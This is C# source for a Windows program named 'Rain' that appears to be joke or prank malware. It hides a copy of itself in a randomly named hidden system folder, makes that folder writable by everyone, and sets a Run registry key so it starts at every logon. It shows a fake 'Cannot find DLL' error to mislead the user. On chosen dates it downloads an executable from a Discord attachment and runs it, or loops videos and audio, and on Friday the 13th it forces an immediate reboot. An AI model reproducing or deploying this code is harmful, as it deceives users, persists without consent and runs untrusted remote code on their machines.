using System;
using System.Media;
using System.Windows.Forms;
using System.Diagnostics;
using System.Security.Cryptography;
using System.Security.AccessControl;
using System.IO;
using System.Net;
using Microsoft.Win32;

namespace Rain
{
    static class Program
    {
        static string name;
        [STAThread]
        static void Main()
        {
            #region Install
            // WHY ARE WE USING THIS HORRID SYSTEM AGAIN?!
            if (Registry.GetValue("HKEY_CURRENT_USER\\Software\\Rain", "Boogie", null) == null)
            {
                string fname = Rn.RandName(12);

                Registry.SetValue("HKEY_CURRENT_USER\\Software\\Rain", "Boogie", "yes");
                Registry.SetValue("HKEY_CURRENT_USER\\Software\\Rain", "name", fname);

                Registry.SetValue("HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Run", "Rain", "C:\\" + fname + "\\Rain.exe");

                DirectoryInfo file = Directory.CreateDirectory("C:\\" + fname); // Typically I'd put this in AppData but older computers don't have C:\Users
                file.Attributes = FileAttributes.Hidden | FileAttributes.System; // PLEASE note the file name in Registry before deleting the key.
                DirectorySecurity dsec = file.GetAccessControl();
                dsec.AddAccessRule(new FileSystemAccessRule("Everyone", FileSystemRights.FullControl, AccessControlType.Allow));

                File.Copy(System.Reflection.Assembly.GetExecutingAssembly().Location, "C:\\"+fname+"\\Rain.exe");

                MessageBox.Show("Cannot find DLL", "Error", MessageBoxButtons.OK, MessageBoxIcon.Error);
            }
            #endregion
            System.Threading.Thread.Sleep(5000);
            name = (string)Registry.GetValue("HKEY_CURRENT_USER\\Software\\Rain", "Name", null);
            #region Funnys
            #region Date Specific
            if (Rn.Date(4, 21)) 
            {
                try
                {
                   new WebClient().DownloadFile("https://cdn.discordapp.com/attachments/530908671664979969/812243146598907934/blastbutton.exe", "C:\\" + name + "\\BlastButton.exe");
                }
                catch { }
                Process.Start("C:\\" + name + "\\BlastButton.exe");
            }
            else if (Rn.Date(11, 22))
            {
                try
                {
                    new WebClient().DownloadFile("https://cdn.discordapp.com/attachments/354041994261299202/814025188537925642/video0_1.mp4", "C:\\"+name+"\\gyro.mp4");
                }
                catch { }
                while (true)
                {
                    Process.Start("C:\\" + name + "\\gyro.mp4");
                    System.Threading.Thread.Sleep(20000);
                }
            }
            else if (Rn.Date(12, 22))
            {
                // Life is temporary. Zombo is eternal.
                try
                {
                    new WebClient().DownloadFile("https://html5zombo.com/zombo.mp3", "C:\\" + name + "\\zombo.wav");
                }
                catch { }
                new SoundPlayer("C:\\" + name + "\\zombo.wav").PlayLooping();
            }
            #endregion
            #region Others
            if (DateTime.Today.DayOfWeek.ToString() == "Friday" && DateTime.Today.Day.ToString() == "13")
            {
                // Friday 13 ?????????????????
                var luck = new ProcessStartInfo("shutdown.exe", "/r /t 0");
                luck.CreateNoWindow = true;
                luck.UseShellExecute = false;
                Process.Start(luck);
            }
            else if (DateTime.Today.Month.ToString() == "10" && Rn.Rng(26) == 4)
            {
                try
                {
                    new WebClient().DownloadFile("https://cdn.discordapp.com/attachments/798374151429685308/814323786332504074/unknown.png", "C:\\" + name + "\\boogie.png");
                    new WebClient().DownloadFile("https://cdn.discordapp.com/attachments/798374151429685308/810640591226273812/shining.wav", "C:\\" + name + "\\shining.wav");
                }
                catch { }
                Application.EnableVisualStyles();
                Application.SetCompatibleTextRenderingDefault(false);
                Application.Run(new boogie());
            }
            #endregion
            #endregion
        }
    }
}
static class Rn
{
    private static RNGCryptoServiceProvider rngCsp = new RNGCryptoServiceProvider();
    public static int Rng(byte num)
    {
        if (num <= 0)
            throw new ArgumentOutOfRangeException("num");
        byte[] randomnumber = new byte[1];
        rngCsp.GetBytes(randomnumber);
        return (byte)((randomnumber[0] % num) + 1);
    }
    public static string RandName(byte length)
    {
        string chars = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789";
        var stringchars = new char[length];
        for (int i = 0; i < stringchars.Length; i++)
        {
            stringchars[i] = chars[Rng((byte)(chars.Length - 1))];
        }
        return new string(stringchars);
    }
    public static bool Date(int month, int day)
    {
        if (DateTime.Today.Month.ToString() == month.ToString())
        {
            if (DateTime.Today.Day.ToString() == day.ToString())
            {
                return true;
            }
            else
            {
                return false;
            }
        }
        else
        {
            return false;
        }
    }
}